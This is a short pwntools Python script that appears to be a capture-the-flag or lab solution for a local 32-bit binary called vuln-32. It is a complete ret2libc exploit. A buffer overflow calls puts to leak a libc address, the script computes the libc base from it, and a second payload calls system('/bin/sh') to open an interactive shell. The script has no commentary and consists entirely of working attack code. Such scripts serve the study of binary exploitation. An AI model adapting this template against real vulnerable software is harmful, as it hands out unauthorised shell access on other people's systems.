from pwn import *

offset=32

exe='./vuln-32'

elf=context.binary=ELF(exe)

libc=elf.libc

p=process()

p.recvline()

payload=flat(
        b'a'*offset,
        elf.plt['puts'],
        elf.sym['main'],
        elf.got['puts']
        )

p.sendline(payload)

libc_addr=u32(p.recv(4))
info(hex(libc_addr))
libc.address=libc_addr-libc.sym['puts']
payload=flat(
        'b'*offset,
        libc.sym['system'],
        0x0,
        next(libc.search(b"/bin/sh"))
        )
p.clean()

p.sendline(payload)

p.interactive()
